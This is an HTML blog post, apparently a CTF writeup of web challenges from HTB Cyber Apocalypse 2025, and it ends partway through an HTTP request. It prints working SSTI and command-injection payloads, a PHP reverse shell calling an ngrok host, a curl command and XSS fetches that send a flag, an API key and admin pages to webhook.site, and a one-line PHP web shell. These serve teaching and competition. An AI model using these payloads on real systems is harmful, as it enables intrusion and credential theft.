@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>HTB Cyber Apocalypse 2025 Writeup - All Web :: elmosalamy | blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This year saw a significant improvement to PwnSec&amp;rsquo;s performance. We moved from 77th last year to achieving 15th this year." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="//localhost:1313/posts/htb-cyber-apocalypse-2025-writeup/" />
+
+
+
+
+<link rel="stylesheet" href="//localhost:1313/assets/style.css">
+
+  <link rel="stylesheet" href="//localhost:1313/assets/green.css">
+
+
+
+<link rel="stylesheet" href="//localhost:1313/style.css">
+
+
+<link rel="apple-touch-icon" href="//localhost:1313/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="//localhost:1313/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Cyber Apocalypse 2025 Writeup - All Web">
+<meta property="og:description" content="Played with PwnSec and ranked 15th worldwide with 76/77 flags which . This is a summary of my solves during the competition." />
+<meta property="og:url" content="//localhost:1313/posts/htb-cyber-apocalypse-2025-writeup/" />
+<meta property="og:site_name" content="elmosalamy | blog" />
+
+  <meta property="og:image" content="//localhost:1313/images/htb-2025.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2025-03-28 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+   <script id="mathjax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [['$$', '$$']],  
+      inlineMath: [['$', '$']]      
+    }
+  };
+</script>
+
+ 
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    elmosalamy
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a target="" href="/posts">📝 Posts</a></li>
+        
+      
+        
+          <li><a target="" href="/tags">🏷️ Tags</a></li>
+        
+      
+        
+          <li><a target="_blank" href="https://aelmosalamy.github.io">🔗 Random stuff</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/posts">📝 Posts</a></li>
+      
+    
+      
+        <li><a href="/tags">🏷️ Tags</a></li>
+      
+    
+      
+        <li><a href="https://aelmosalamy.github.io">🔗 Random stuff</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/htb-cyber-apocalypse-2025-writeup/">HTB Cyber Apocalypse 2025 Writeup - All Web</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2025-03-28 
+      </span>
+    
+    
+    <span class="post-author">:: aelmo</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="//localhost:1313/tags/ctf/">ctf</a>&nbsp;
+    
+  </span>
+  
+
+  
+    <img src="//localhost:1313/images/htb-2025.png" class="post-cover" alt="HTB Cyber Apocalypse 2025 Writeup - All Web" />
+  
+
+  
+    <div class="table-of-contents">
+      <h2>
+        
+          Table of Contents
+        
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#web-trial-by-fire---very-easy">Web: Trial By Fire - Very Easy</a></li>
+    <li><a href="#web-whispers-of-the-moonbeam---very-easy">Web: Whispers of The Moonbeam - Very Easy</a></li>
+    <li><a href="#web-cyber-attack---easy">Web: Cyber Attack - Easy</a></li>
+    <li><a href="#web-eldoria-realms---medium">Web: Eldoria Realms - Medium</a></li>
+    <li><a href="#web-eldoria-panel---medium">Web: Eldoria Panel - Medium</a></li>
+    <li><a href="#web-aurors-archive---hard">Web: Aurors Archive - Hard</a></li>
+    <li><a href="#blockchain-eldorion---very-easy">Blockchain: Eldorion - Very Easy</a></li>
+    <li><a href="#blockchain-heliosdex---easy">Blockchain: HeliosDEX - Easy</a></li>
+    <li><a href="#flag">FLAG</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <p>This year saw a significant improvement to PwnSec&rsquo;s performance. We moved from 77th last year to achieving 15th this year.</p>
+<p>Below is a short account of each of the web challenges I solved. This is rather summarized compared to my usual comprehensive walkthroughs due to time constraints on my side. Apologies for that.</p>
+<h2 id="web-trial-by-fire---very-easy">Web: Trial By Fire - Very Easy<a href="#web-trial-by-fire---very-easy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>A Jinja2 SSTI that is triggered in the <code>/battle-report</code> based on your warrior&rsquo;s name:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> httpx
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://83.136.249.101:33732&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> httpx<span style="color:#f92672">.</span>Client(base_url<span style="color:#f92672">=</span>url) <span style="color:#66d9ef">as</span> client:
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;/begin&#39;</span>, data<span style="color:#f92672">=</span>dict(warrior_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{lipsum.__globals__.os.popen(&#39;cat flag.txt&#39;).read()}}&#34;</span>))
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;/battle-report&#39;</span>, data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;damage_dealt=68&amp;damage_taken=105&amp;spells_cast=2&amp;turns_survived=3&amp;outcome=defeat&amp;battle_duration=26.945&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(r<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><p><code>HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_e9f8c148ac7f49bb3d2d00093473056d}</code></p>
+<h2 id="web-whispers-of-the-moonbeam---very-easy">Web: Whispers of The Moonbeam - Very Easy<a href="#web-whispers-of-the-moonbeam---very-easy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Simple command injection in the <code>gossip</code> command, some initial attempts:
+<img src="/posts/htb-cyber-apocalypse-2025-writeup/whispers_htb.png"></p>
+<p>We notice <code>gossip</code> displays an <code>ls</code>-like output. Command injection:</p>
+<pre tabindex="0"><code>gossip ; cat flag.txt
+</code></pre><p><code>HTB{Sh4d0w_3x3cut10n_1n_Th3_M00nb34m_T4v3rn_8bafcd34a8f4593225ff0b8ee006ac88}</code></p>
+<h2 id="web-cyber-attack---easy">Web: Cyber Attack - Easy<a href="#web-cyber-attack---easy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Solved by my teammates <strong>@zAbuQasem</strong> and <strong>@0xNEF</strong>.</p>
+<p>Header Injection to SSRF to access the protected <code>/attack-ip</code> endpoint.</p>
+<p>We then abuse IPv6 parsing vulnerability in Python&rsquo;s <code>ipaddress</code> library to introduce a command injection in the <code>/cgi-bin/attack-ip</code> endpoint via Scope ID.</p>
+<p>Scope IDs append extra information to an IPv6 address using a <code>%</code> suffix such as <code>::1%eth1</code> for example.</p>
+<p>We can use that to deliver a PHP reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /cgi-bin/attack-domain?target=-&amp;name=a%0d%0aLocation:+/yyy%0d%0aContent-Type:+proxy:http://127.0.0.1:80/cgi-bin/attack-ip%3ftarget=::1%||php%2b-r%2b&#39;$sock%253dfsockopen(&#34;4.tcp.eu.ngrok.io&#34;,19505)%253bexec(&#34;bash%2b&lt;%25263%2b&gt;%25263%2b2&gt;%25263&#34;)%253b&#39;%26name=aaa%0d%0a%0d%0a <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span></code></pre></div><p>And&hellip; we get a shell back.</p>
+<p><code>HTB{h4ndl1n6_m4l4k4r5_f0rc35}</code></p>
+<h2 id="web-eldoria-realms---medium">Web: Eldoria Realms - Medium<a href="#web-eldoria-realms---medium" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Ruby class pollution to gRPC command injection via <code>gopher://</code> SSRF. I used these two references:</p>
+<ol>
+<li><a href="https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html">https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html</a></li>
+<li><a href="https://bkubiak.github.io/grpc-raw-requests/">https://bkubiak.github.io/grpc-raw-requests/</a></li>
+</ol>
+<p>We can connect to the gRPC service locally using <code>grpcurl</code> or <code>grpcui</code>. I used <code>grpcui</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
+</span></span><span style="display:flex;"><span>grpcui -proto .<span style="color:#ae81ff">\c</span>hallenge<span style="color:#ae81ff">\l</span>ive_data.proto  -plaintext 127.0.0.1:50051
+</span></span></code></pre></div><p>It looks like this:
+<img alt="grpc_htb" src="/posts/htb-cyber-apocalypse-2025-writeup/grpc_htb.png"></p>
+<p>I set up Wireshark and filtered for messages on <code>tcp/50051</code>, as per the gRPC reference&rsquo;s tip:</p>
+<blockquote>
+<p>If you don’t see packets in HTTP2 protocol, click “Analyze” -&gt; “Decode As…”. Then, add TCP port X with HTTP2 protocol, where X is port of gRPC server (e.g. 8083).</p>
+</blockquote>
+<ol>
+<li>I grabbed every HTTP/2 payload, by right click, &ldquo;Copy TCP payload&rdquo; to make up the complete packet we want to send.</li>
+<li>We use the Ruby class pollution to poison <code>realm_url</code> and inject our payload.</li>
+<li>We use <code>gopher://</code>, a legacy protocol supported by <code>curl</code> because it allows us to send raw TCP packets over the wire.</li>
+</ol>
+<p>You can see me here doing some debugging with <code>sleep</code> statements. It seemed like the HTTP/2 packet was getting corrupted:
+<img src="/posts/htb-cyber-apocalypse-2025-writeup/gopher_received.png"></p>
+<p>We should have <code>PRI</code> not <code>50RI</code> in the output above.</p>
+<p>I tried prepending the <code>gopher://</code> payload with an extra character and it worked. My script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> httpx
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://94.237.63.165:53622&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># url = &#39;http://localhost:1337&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> httpx<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/player-status&#39;</span>)
+</span></span><span style="display:flex;"><span>print(r)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># raw grpc http2 bytes from wireshark</span>
+</span></span><span style="display:flex;"><span>magic    <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;505249202a20485454502f322e300d0a0d0a534d0d0a0d0a&#39;</span>
+</span></span><span style="display:flex;"><span>settings <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;000000040000000000000006040000000000000500004000000000040100000000000000040100000000&#39;</span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;000061010400000001838645986283772af9cddcb7c691ee2d9dcc42b17a7293ae328e84cf418b089d5c0b8170dc6c006c3f5f8b1d75d0620d263d4c4d65647a8a9acac8b4c7602bb815c140027465864d833505b11f408e9acac8b0c842d6958b510f21aa9b839bd9ab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ip=; curl hook -d &#34;x=$(cat /fl*)&#34;</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;00005b00010000000100000000560a543b6375726c2068747470733a2f2f776562686f6f6b2e736974652f62666661383561392d633139642d346538632d623630392d336565653436363038313633202d642022783d2428636174202f666c2a29222023&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> magic <span style="color:#f92672">+</span> settings <span style="color:#f92672">+</span> headers <span style="color:#f92672">+</span> data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>encoded <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(payload), <span style="color:#ae81ff">2</span>):
+</span></span><span style="display:flex;"><span>    encoded <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">+</span> payload[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(encoded)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html</span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> httpx<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/merge-fates&#39;</span>, json<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;class&#34;</span>:
+</span></span><span style="display:flex;"><span>                                           {<span style="color:#e6db74">&#34;superclass&#34;</span>:
+</span></span><span style="display:flex;"><span>                                            {<span style="color:#e6db74">&#34;realm_url&#34;</span>: <span style="color:#e6db74">&#34;gopher://127.0.0.1:50051/a&#34;</span> <span style="color:#f92672">+</span> encoded}}})
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> httpx<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/connect-realm&#39;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><p><code>HTB{p0llut3_4nd_h1t_pr0toc0lz_w_4_sw1tch_b3c81179fbcfe17e57f49e24d64f1240}</code></p>
+<h2 id="web-eldoria-panel---medium">Web: Eldoria Panel - Medium<a href="#web-eldoria-panel---medium" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>There was a mutation XSS in DOMPurify 3.1.2 as shown here by <code>mizu.re</code>:</p>
+<ul>
+<li><a href="https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dompurify-3.1.2-bypass">https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dompurify-3.1.2-bypass</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://127.0.0.1:80/api/updateStatus&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/plain&#34;</span>
+</span></span><span style="display:flex;"><span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;inp&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{&#34;status&#34;: &#34;&lt;form id&#39;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">btoa</span><span style="color:#e6db74">`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  setTimeout(() =&gt; {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    fetch(&#39;http://webhook.site/bffa85a9-c19d-4e8c-b609-3eee46608163?exfil=&#39;+apiKey.textContent)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  }, 1000)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">xss</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">\\&#34;x \\&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;svg&gt;&lt;style&gt;&lt;a id=\\&#34;&lt;/style&gt;&lt;img src=x onerror=eval(atob\`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">payload</span><span style="color:#e6db74">}</span><span style="color:#e6db74">\`)&gt;\\&#34;&gt;&lt;/a&gt;&lt;/style&gt;&lt;/svg&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/form&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;input form=\\&#34;x\\&#34; name=\\&#34;namespaceURI\\&#34;&gt;\&#34;}`</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;load&#34;</span>, <span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">inp</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">xss</span>;
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>I used this to successfully steal the admin&rsquo;s API key. However, as I noticed later, the <code>X-API-Key</code> logic was incorrectly implemented and served no purpose. We could access admin functionality directly and without it.</p>
+<p>In one of the admin routes, <code>file_get_contents</code> is used against user-controlled input, however <code>file_exists</code> is used to validate the input beforehand. Since <code>php://</code> and <code>http://</code> wrappers <a href="https://www.php.net/manual/en/wrappers.php">do not support <code>stat()</code> functions</a>, we can not use these wrappers. A URL scheme that supports <code>stat()</code> is <code>ftp://</code>. This means we can deliver our payload via FTP.</p>
+<p>We can&rsquo;t use <code>ngrok</code> or single port forwarding techniques because my intended way of hosting the FTP server involved <code>twisted</code> which uses FTP passive mode and subsequentially requires two ports (control port at 21 and data port agreed upon during file transmission). That&rsquo;s why we must use an external server (or enforce FTP in active mode - not sure if that can be enforced server-side).</p>
+<p>On a throwaway VPS, I hosted <code>twistd</code> FTP, placing a web shell at <code>login.php</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>twistd -n ftp -p <span style="color:#ae81ff">21</span> -r .
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// login.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">`$_GET[1]`</span>; <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Modify the template path to an anonymous FTP share:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> curl http://94.237.58.215:42557/api/admin/appSettings -b PHPSESSID<span style="color:#f92672">=</span>62737133bf4e771f2bb1ddd694545a83 -H <span style="color:#e6db74">&#39;X-API-Kea7242928e01a&#39;</span> -d <span style="color:#e6db74">&#39;{&#34;template_path&#34;: &#34;ftp://anonymous@mydomain.com&#34;}&#39;</span>
+</span></span></code></pre></div><p>Visiting <code>/?1=cat /flag.txt</code>, we get our flag.</p>
+<p><code>HTB{p41n_c4us3d_by_th3_usu4l_5u5p3ct_d16c96bc407976fddf4b45d3ec032cf6}</code></p>
+<h2 id="web-aurors-archive---hard">Web: Aurors Archive - Hard<a href="#web-aurors-archive---hard" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>After analyzing the OAuth server provided, I found an unintended that completely ignores the OAuth flow. There was an XSS via SSTI in the submissions and bids endpoint:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submissions-data&#34;</span> <span style="color:#a6e22e">data-submissions</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{{ submissions | dump | safe }}&#39;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></code></pre></div><p>The author probably thought that <code>dump</code> (Convert data to a JSON string) will prevent bypass? Not sure.</p>
+<p>Anyways, we can escape by submitting a bid with the following payload, using single quotes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#39;&gt;&lt;/<span style="color:#f92672">div</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span>
+</span></span></code></pre></div><p><img src="/posts/htb-cyber-apocalypse-2025-writeup/submission_xss.png"></p>
+<p>The XSS reflected in <code>/my-submissions</code>, which made it difficult to deliver to admin. I played around with different CSRF techniques to get the admin to poison his own page before visiting it, but all attempts ultimately failed due to <code>SameSite=Lax</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://94.237.58.253:42840/api/submissions&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/plain&#34;</span>
+</span></span><span style="display:flex;"><span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;inp&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{&#34;x&#34;:&#34;&#39;</span> /&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>).<span style="color:#a6e22e">has</span>(<span style="color:#e6db74">&#39;2nd&#39;</span>)) {
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`1&#34;,&#34;name&#34;:&#34;&#39;&gt;&lt;img src onerror=\&#34;fetch(&#39;/admin&#39;).then(r=&gt;r.text()).then(page =&gt; fetch(&#39;http://webhook.site/hook&#39;, {method: &#39;POST&#39;, body: page}))\&#34; /&gt;&lt;div d=&#39;&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;description&#34;:&#34;a&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;url&#34;:&#34;https://webhook.site/hook?2nd=1&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;category&#34;:&#34;research&#34;}`</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">inp</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">payload</span>;
+</span></span><span style="display:flex;"><span>  document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>I ended up using the <code>bids</code> endpoint which was publicly accessible and provided intuitive delivery.</p>
+<p>However, since there is a length check on <code>bids</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bid</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Too long&#39;</span> });
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>We can easily bypass that by sending our payload inside a JSON array, allowing us to send an arbitrarily large payload.</p>
+<p>We can send a payload like this, allowing us to perform a CSRF and exfiltrate the internal <code>/tables</code> admin endpoint:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>POST /api/auctions/6/bids HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 94.237.58.253:42840
+</span></span><span style="display:flex;"><span>Content-Length: 184
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.9
+</span></span><span style="display:flex;"><span>Accept: application/json, text/plain, */*
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+</span></span><span style="display:flex;"><span>Origin: http://94.237.58.253:42840
